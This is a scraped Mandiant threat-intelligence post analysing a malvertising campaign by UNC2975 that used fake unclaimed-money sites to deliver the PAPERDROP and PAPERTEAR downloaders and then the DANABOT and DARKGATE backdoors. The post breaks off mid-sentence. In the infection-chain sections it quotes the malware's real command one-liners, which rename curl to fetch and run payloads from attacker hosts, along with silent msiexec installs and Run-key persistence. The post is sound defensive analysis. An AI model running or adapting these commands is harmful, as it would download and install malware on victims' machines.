class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: Ryan Tomcik, Adrian McCabe, Rufus Brown, Geoff Ackerman</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p dir="ltr">Earlier this year, Mandiant’s Managed Defense threat hunting team identified an UNC2975 malicious advertising (“malvertising”) campaign presented to users in sponsored search engine results and social media posts, consistent with activity reported in <a href="https://www.esentire.com/blog/from-darkgate-to-danabot" rel="noopener" target="_blank">From DarkGate to DanaBot</a>. This campaign dates back to at least June 19, 2023, and has abused search engine traffic and leveraged malicious advertisements to affect multiple organizations, which resulted in the delivery of the DANABOT and DARKGATE backdoors.</p>
<p dir="ltr">Managed Defense worked with Advanced Practices and with the Google Anti-Malvertising team to remove the malicious advertisements from the ads ecosystem, and subsequently alerted other impacted organizations to also take actions against this campaign.</p>
<p dir="ltr">This blog post covers the details of recently discovered infrastructure operated by the distribution threat cluster UNC2975, which Mandiant has tracked since 2021, that leveraged malicious advertisements to trick users into visiting fake “unclaimed funds'' themed websites. In this UNC2975 campaign, the malicious websites delivered PAPERDROP and PAPERTEAR downloader malware that eventually led to DANABOT and DARKGATE backdoor malware. This blog post also highlights how Mandiant's findings result in takedowns of malicious ad campaigns served on Google infrastructure.</p>
<h2 dir="ltr">UNC2975 Targeting and TTPs</h2>
<p dir="ltr">Mandiant currently tracks around 30 threat clusters that use malicious advertisements for the delivery of malware, including backdoors, data stealers, and downloaders. Since at least 2021, a threat actor tracked as UNC2975 has leveraged this technique to distribute downloader malware for second-stage payloads on victim endpoints.</p>
<p dir="ltr">UNC2975 is a distribution threat cluster that has historically used malvertising in order to distribute the VBScript-based downloader tracked as PAPERDROP. The distribution of PAPERDROP from UNC2975’s fake websites has primarily led to the deployment of the Delphi-based backdoor DANABOT. DANABOT is part of a Malware-as-a-Service platform where multiple affiliates can purchase access to the service. Beginning in September 2023, UNC2975’s malware distribution shifted. Instead of DANABOT, UNC2975 deployed a Delphi-based backdoor tracked as part of the DARKGATE Malware-as-a-Service platform. Due to multiple affiliates using these service platforms, the distribution methods of DANABOT and DARKGATE may vary across different distribution actors.</p>
<p dir="ltr">UNC2975 creates fake websites that leverage themes such as unclaimed money, family ancestry, and astrology/horoscopes to facilitate its distribution operations. The threat cluster has commonly used social media advertisements to promote the fake websites but have since expanded to leverage additional platforms such as Microsoft and Google advertising.</p>
<h2 dir="ltr">Ads Backwards: A Google Malvertising Response Team Investigation</h2>
<p dir="ltr">Upon being notified of this campaign by Mandiant Managed Defense, the Google Anti-Malvertising team took enforcement actions and pivoted on the advertisement metadata to find additional related entries and to improve abuse detection and classification systems.</p>
<p dir="ltr">Adversaries use several sophisticated techniques including impersonating genuine businesses, cloaking (i.e., hiding malicious web pages that only get revealed under specific conditions), and redirection to circumvent Google Ads verification and defense mechanisms.</p>
<p dir="ltr">To protect users, Google detects, prevents, and blocks abusive activity as detailed in our annual <a href="https://blog.google/products/ads-commerce/our-2022-ads-safety-report/" rel="noopener" target="_blank"><u>Ads Safety report</u></a>. Google encourages users to report suspicious advertisements they come across through either <a href="https://support.google.com/My-Ad-Center-Help/answer/13861201?hl=en-GB&amp;sjid=5587482143761892718-NA" rel="noopener" target="_blank"><u>My Ad Center reporting functionality</u></a> or using <a href="https://support.google.com/ads/contact/vio_other_aw_policy" rel="noopener" target="_blank"><u>this form</u></a>.</p>
<h2 dir="ltr">Malware Observed</h2>
<p dir="ltr">Mandiant observed the following malware families while investigating this campaign.</p>
<div dir="ltr"><br>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr"><strong>Malware Family</strong></p>
</td>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr"><strong>Description</strong></p>
</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">PAPERDROP</p>
</td>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">PAPERDROP is a downloader written in Visual Basic Script that communicates via HTTPS. It has been observed downloading DANABOT by writing it to disk and then executing it.</p>
</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">PAPERTEAR</p>
</td>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">PAPERTEAR is a downloader written in Visual Basic Script that communicates via HTTP. PAPERTEAR appends a list of enumerated local processes in the initial HTTP request.</p>
</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">DANABOT</p>
</td>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">DANABOT is a backdoor written in Delphi that communicates using a custom binary protocol over TCP. The backdoor implements a plug-in framework that allows it to add capabilities via downloaded plugins. DANABOT's capabilities include full system control using a VNC or RDP plugin, video and screenshot capture, keylogging, arbitrary shell command execution, and file transfer. DANABOT's proxy plugin allows it to redirect or manipulate network traffic associated with targeted websites. This capability is often used to capture credentials or payment data. DANABOT can also extract stored credentials associated with web browsers and FTP clients.</p>
<p> </p>
<p dir="ltr">Numerous observed campaigns leveraging DANABOT have been reported, including UNC3379 activity associated with a <a href="https://cloud.google.com/blog/topics/threat-intelligence/supply-chain-node-js" rel="noopener" target="_blank">coinminer campaign</a>, and a similar mechanism for DANABOT distribution using a <a href="https://www.bleepingcomputer.com/news/security/popular-coa-npm-library-hijacked-to-steal-user-passwords/" rel="noopener" target="_blank">different JS library</a>.</p>
</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">DARKGATE</p>
</td>
<td style="border:1px solid #000000;padding:16px">
<p dir="ltr">DARKGATE is a Delphi-based backdoor capable of performing keyboard capture, shell command execution, file transfer and execution, and credential theft. Other functions include system survey, shutdown and restart, taking screengrabs and controlling a cryptominer. Some variants retrieve their command-and-control (C2 or C&amp;C) address from a page on the pastebin.com website.</p>
<p> </p>
<p dir="ltr">More notable instances of OSINT reporting involving DARKGATE include <a href="https://techcrunch.com/2023/10/05/qakbot-hackers-are-still-spamming-victims-despite-fbi-takedown/" rel="noopener" target="_blank">actors previously associated with QAKBOT leveraging DARKGATE as a payload</a>, and some insights into <a href="https://github.security.telekom.com/2023/08/darkgate-loader.html" rel="noopener" target="_blank">DARKGATE’s technical architecture and use</a>.</p>
</td>
</tr>
</tbody>
</table></div>
</div>

</div>
<h2 dir="ltr">A Pain in the Ads: UNC2975 Campaign Discovery</h2>
<p>Threat actors purchase advertisements [MITRE ATT&amp;CK® Technique <a href="https://attack.mitre.org/techniques/T1583/008/" rel="noopener" target="_blank"><u>T1583.008</u></a>] for malicious websites with the goal of tricking users into visiting and downloading malware [<a href="https://attack.mitre.org/techniques/T1189/" rel="noopener" target="_blank"><u>T1189</u></a>], which can lead to data theft and <a href="https://cloud.google.com/blog/topics/threat-intelligence/magniber-ransomware-infects-only-the-right-people" rel="noopener" target="_blank"><u>ransomware</u></a>. Platforms that serve advertisements, such as search engines or social media, can provide granular controls that allow advertisers to target specific audiences based on users’ geographic locations, IP address range (e.g., geofencing), browsing history, and <a href="https://cloud.google.com/blog/topics/threat-intelligence/how-rise-cryptocurrencies-shaping-cyber-crime-landscape-growth-miners" rel="noopener" target="_blank"><u>device types</u></a>. Some of the more robust advertising platforms (such as <a href="https://about.ads.microsoft.com/en-us/insights/planning-tools/microsoft-audience-network-data" rel="noopener" target="_blank"><u>Bing</u></a> and Google <a href="https://support.google.com/google-ads/answer/2580383" rel="noopener" target="_blank"><u>Ads</u></a>) provide even more targeting categories, like age, gender, income level, and other audience attributes. These capabilities allow advertisers, both legitimate and malicious, to craft ads specific to their desired targets and improve the effectiveness of their campaigns. This also allows malicious advertisers who are able to avoid policy enforcement to develop and retain “customer” profiles about the victims who interact with their ads for use in future targeting operations.</p>
<p>Earlier this year, Managed Defense’s threat hunting team identified UNC2975 advertisements presented to users in sponsored search engine results and social media posts. The advertised websites were displayed in the sponsored results for searches related to “unclaimed money” where individuals can search for and claim funds that are held by federal or state government agencies [<a href="https://attack.mitre.org/techniques/T1583/008/" rel="noopener" target="_blank"><u>T1583.008</u></a>].</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" <p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 2: Browser history artifacts showing where the malicious advertisement was promoted<br></span></p>
</div>
<p>The downloadable “reports” were actually ZIP archive files containing Visual Basic scripts that Mandiant identified as variants of the downloader malware families PAPERDROP and PAPERTEAR. The ZIP archive and Visual Basic script filenames were based on the values the user submitted into the web form. Launching the Visual Basic script from an archive file generates a process execution event that launches the script from a temporary folder path [<a href="https://attack.mitre.org/techniques/T1059/005/" rel="noopener" target="_blank"><u>T1059.005</u></a>]. The temporary folder path that’s created is dependent on the archiving utility, such as WinRAR, that’s used to unpack the archive file.</p>

<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 3: Initial Visual Basic script payload download and execution</span></p>
<p>Mandiant identified three different delivery chains that PAPERDROP and PAPERTEAR used to download and execute secondary payloads DANABOT and DARKGATE malware attributed to multiple UNC groups. Two delivery chains leveraged a renamed version of the cURL binary <code>curl.exe</code> [<a href="https://attack.mitre.org/techniques/T1105/" rel="noopener" target="_blank"><u>T1105</u></a>] to download a malicious installation package <code>.msi</code> file [<a href="https://attack.mitre.org/techniques/T1218/007/" rel="noopener" target="_blank"><u>T1218.007</u></a>] or an AutoIt executable, <code>AutoIt3.exe</code> and malicious AutoIt script, <code>.au3</code> file [<a href="https://attack.mitre.org/techniques/T1059/" rel="noopener" target="_blank"><u>T1059</u></a>]. Mandiant also observed PAPERDROP download and execute a malicious installation package file without using a specific transfer tool.</p>

<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 4: PAPERDROP and PAPERTEAR delivery chains</span></p>
<p>The subsequent system artifacts that were created varied depending on the backdoor payload that was delivered. The post-delivery infection timelines shown in the following sections may not represent all potential artifacts as complete malware execution may have been disrupted by endpoint security software or network controls.</p>
<h2>Infection Chain #1: PAPERDROP &gt; DANABOT</h2></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig4.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig4.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig4.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig4.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 3: Infection chain #1 involving DANABOT</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>In the first infection chain following PAPERDROP execution, the Windows Script Host process <code>wscript.exe</code> performed a DNS request for the domain <code>mesa.halibut[.]sbs</code> and connected to the IP address <code>47.252.45[.]173</code> over port <code>443</code>. The process <code>wscript.exe</code> then executed the Windows Installer utility <code>msiexec.exe</code> [<a href="https://attack.mitre.org/techniques/T1218/007/" rel="noopener" target="_blank"><u>T1218.007</u></a>] with the command <code>msiexec /i C:\programData\HLWOIRTAA9P.bin /qn</code> to quietly install an application using the package file <code>C:\programData\HLWOIRTAA9P.bin</code> that masqueraded as a <code>.bin</code> file [<a href="https://attack.mitre.org/techniques/T1036/008/" rel="noopener" target="_blank"><u>T1036.008</u></a>]. Next, the Msiexec application launched the installer process <code>C:\Windows\Installer\MSI4F8C.tmp</code> which executed the <code>rundll32.exe</code> command <code>C:\WINDOWS\system32\rundll32.exe C:\Users\&lt;user&gt;\AppData\Local\Temp\Oadsoophotfp.dll,start</code> to load the in-memory dropper DLL file <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Oadsoophotfp.dll</code> and execute a function named <code>start</code> to decompress and deobfuscate a DANABOT payload [<a href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener" target="_blank"><u>T1218.011</u></a>]. The <code>rundll32.exe</code> process performed a series of writes to extensionless files under the user’s <code>AppData\Local\Temp</code> directory.</p>
<p>The infected <code>rundll32.exe</code> process communicated with the IP address <code>35.203.111[.]228</code> over port <code>443</code> and the local IP address <code>127.0.0[.]1</code> over ports <code>22405</code> and <code>52787</code>. The DANABOT malware launched the command <code>"C:\WINDOWS\system32\rundll32.exe" "C:\WINDOWS\system32\shell32.dll",#61 22405</code> to open and interact with the Run dialog that is  normally accessed through the Start Menu. Lastly, the infected <code>rundll32.exe</code> process executed the commands <code>schtasks /End /tn \Microsoft\Windows\Wininet\CacheTask</code> and <code>schtasks /Run /tn \Microsoft\Windows\Wininet\CacheTask</code> to stop and start the Wininet Cache Task [<a href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener" target="_blank"><u>T1053.005</u></a>]. This Scheduled Task activity may be related to Wininet API hooking to intercept credentials entered into Microsoft Edge or Internet Explorer. Finally, the DANABOT infected <code>rundll32.exe</code> process created and wrote to a randomly named <code>.tmp</code> file, such as <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\tmpAEA8.tmp</code> or <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Aroeihiaietwq.tmp</code>.</p>
<p>Although not observed in each case, Mandiant identified Run key persistence to execute the DANABOT payload in the file <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Oadsoophotfp.dll</code> using a random key value: <code>HKEY_USERS\&lt;user&gt;\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Hryrqsf</code> [<a href="https://attack.mitre.org/techniques/T1547/001/" rel="noopener" target="_blank"><u>T1547.001</u></a>].</p>
<h2>Infection Chain #2: PAPERTEAR &gt; RENAMED CURL &gt; DARKGATE</h2></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig5.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig5.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig5.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig5.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 4: Infection chain #2 involving DARKGATE</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>In the second infection chain, the PAPERTEAR downloader performed an HTTP POST request to the host <code>infocatalog[.]pics</code> over port <code>8080</code>. Next, the <code>wscript.exe</code> process executed the Windows Command Shell using an extended one-liner consisting of multiple commands, shown in Figure 5.</p>
<p> </p>
<pre><code>Command Line:
&quot;C:\Windows\System32\cmd.exe&quot; /c mkdir c:\yifr &amp; cd /d c:\yifr &amp; copy c:\windows\system32\curl.exe yifr.exe &amp; yifr -H &quot;User-Agent: curl&quot; -o Autoit3.exe http[:]//infocatalog[.]pics:8080 &amp; yifr -o khscrk.au3 http[:]//infocatalog[.]pics:8080/msiyifrmouv &amp; Autoit3.exe khscrk.au3

Command Breakdown:
mkdir c:\yifr
Create the directory c:\yifr
cd /d c:\yifr
Change the working directory to the folder c:\yifr
copy c:\windows\system32\curl.exe yifr.exe
Copy the cURL binary curl.exe to a new file named yifr.exe
yifr -H &quot;User-Agent: curl&quot; -o Autoit3.exe http[:]//infocatalog[.]pics:8080
Use the renamed cURL binary to download the file Autoit3.exe hosted on the domain infocatalog[.]pics
yifr -o khscrk.au3 http[:]//infocatalog[.]pics:8080/msiyifrmouv
Use the renamed cURL binary to download the file khscrk.au3 hosted on the domain infocatalog[.]pics
Autoit3.exe khscrk.au3
Execute the AutoIt script file khscrk.au3 using Autoit3.exe to install DARKGATE malware</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 5: Breakdown of Windows Command Shell one-liner to drop DARKGATE</span></p>
<h2>Infection Chain #3: PAPERDROP &gt; RENAMED CURL &gt; DANABOT</h2></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig7.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig7.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig7.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig7.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 6: Infection chain #3 involving DANABOT</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>In the third infection chain, the PAPERDROP downloader executed another extended one-liner that used a renamed <code>curl.exe</code> binary <a href="https://attack.mitre.org/techniques/T1105/" rel="noopener" target="_blank"><u>[T1105</u></a>] to download and install a malicious package file that drops DANABOT [<a href="https://attack.mitre.org/techniques/T1218/007/" rel="noopener" target="_blank"><u>T1218.007</u></a>]. </p>
<p> </p>
<pre><code>Command Line:
&quot;C:\Windows\System32\cmd.exe&quot; /c cd /d C:\Users\%USERNAME%\AppData\Local\Temp\ &amp; copy c:\windows\system32\curl.exe ihcbzhY.exe &amp; ihcbzhY.exe -o SYUxEbPz.msi https://durham.soulcarelife[.]org/?n3sqd95xk20z2b3vue9tnpiadp2j6 &amp; C:\Windows\System32\msiexec.exe /i SYUxEbPz.msi /qn

Command Breakdown:

cd /d C:\Users\%USERNAME%\AppData\Local\Temp\
Change the working directory to the folder C:\Users\%USERNAME%\AppData\Local\Temp\
copy c:\windows\system32\curl.exe ihcbzhY.exe
Copy the cURL binary curl.exe to a new file named ihcbzhY.exe
ihcbzhY.exe -o SYUxEbPz.msi https://durham.soulcarelife[.]org/?n3sqd95xk20z2b3vue9tnpiadp2j6
Use the renamed cURL binary to download the file SYUxEbPz.msi hosted on the domain durham.soulcarelife[.]org
C:\Windows\System32\msiexec.exe /i SYUxEbPz.msi /qn
Install the malicious package file using Msiexec</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 7: Breakdown of Windows Command Shell one-liner to drop DANABOT</span></p>
<p>Following the execution of the <code>SYUxEbPz.msi</code> package installation, the <code>msiexec.exe</code> process created files to spoof the appearance of the Cisco Umbrella Roaming application under the directory <code>C:\Users\&lt;user&gt;\AppData\Roaming\Cisco Corp\Umbrella Roaming Client\Umbrella Roaming Client</code>. One file in the new directory — <code>CoreReborn32.bin</code> — was identified as a DANABOT launcher. In a separate investigation, Mandiant identified a folder path that spoofed the Box Edit application and dropped a DANABOT payload to the path <code>C:\Users\&lt;user&gt;\AppData\Roaming\Box Inc\Box Edit\Box Edit\Box.LocalComServer.Fix.Environment.dll</code>.</p>
<p>Next, the Windows Installer process <code>C:\Windows\Installer\MSI23C9.tmp</code> launched the DANABOT backdoor with the Rundll32 command <code>rundll32.exe &quot;C:\Users\&lt;user&gt;\AppData\Roaming\Cisco Corp\Umbrella Roaming Client\Umbrella Roaming Client\CoreReborn32.bin&quot;,start</code> [<a href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener" target="_blank"><u>T1218.011</u></a>]. Once executed, the DANABOT infected <code>rundll32.exe</code> process wrote to the Windows Run key <code>HKEY_USERS\&lt;user&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Srfshu</code> to ensure persistent execution of the command <code>&quot;C:\WINDOWS\system32\RUNDLL32.EXE&quot; &quot;C:\Users\&lt;user&gt;\AppData\Roaming\Cisco Corp\Umbrella Roaming Client\Umbrella Roaming Client\CoreReborn32.bin&quot;,start</code> [<a href="https://attack.mitre.org/techniques/T1547/001/" rel="noopener" target="_blank"><u>T1547.001</u></a>]. In addition to Run key persistence, Mandiant has also identified the capability for DANABOT to use a new Windows service [<a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener" target="_blank"><u>T1543.003</u></a>] using the <code>ServiceDll</code> entry to point to the malicious DLL.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig9.max-1300x1300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig9.max-1300x1300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 8: Infection chain #3 involving DANABOT</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Similar to the first infection chain, the infected <code>rundll32.exe</code> performed a series of writes to extensionless files under the user’s <code>AppData\Local\Temp</code> directory and communicated with the IP address <code>34.16.181[.]0</code> over port <code>443</code> and the local IP address <code>127.0.0[.]1</code> over port <code>15066</code>. The DANABOT malware launched the command <code>"C:\WINDOWS\system32\rundll32.exe" "C:\WINDOWS\system32\shell32.dll",#61 15066</code> to open and interact with the Run dialog and executed the commands <code>schtasks /End /tn \Microsoft\Windows\Wininet\CacheTask</code> and <code>schtasks /Run /tn \Microsoft\Windows\Wininet\CacheTask</code> to stop and start the Wininet Cache Task [<a href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener" target="_blank"><u>T1053.005</u></a>]. The DANABOT payload also modified the local proxy settings in the Windows registry [<a href="https://attack.mitre.org/techniques/T1562/" rel="noopener" target="_blank"><u>T1562</u></a>].</p>
<p>Finally, the DANABOT-infected <code>rundll32.exe</code> process wrote to a randomly named <code>.tmp</code> file <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Prfpdh.tmp</code>.</p>
<h2>WiseAds Comments: PAPERDROP and PAPERTEAR</h2>
<p>Throughout the course of the observed malvertising campaign, Mandiant encountered both PAPERDROP and PAPERTEAR Visual Basic Script (VBS) files in use by malicious actors to facilitate payload deployment.</p>
<p>The main difference in functionality between PAPERDROP and PAPERTEAR is that PAPERDROP makes heavier use of local files to facilitate payload deployment, whereas PAPERTEAR leverages direct command line execution.</p>
<h3>PAPERDROP</h3>
<p>Initially observed by Mandiant in January 2021 in use by UNC2975, PAPERDROP is primarily associated with DANABOT payload distribution and generally has several distinct characteristics across two different build types. NOTE: Since 2021, PAPERDROP has been observed in use by multiple UNC groups. The samples shown in this section represent a cross-section of the PAPERDROP malware family as a whole, and are not specific to UNC2975 activity.</p>
<p>The first build type is markedly denser than the second. It features prominent use of code comments, complex variable names, and other junk code presumably used as a rudimentary code obfuscation mechanism [<a href="https://attack.mitre.org/techniques/T1027/" rel="noopener" target="_blank"><u>T1027</u></a>].</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 9: PAPERDROP type #1, junk code and comments</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>In addition to the more commonly observed mechanism for code comments leveraging single quotes <code>‘</code>, Visual Basic also allows the use of the characters “REM” to <a 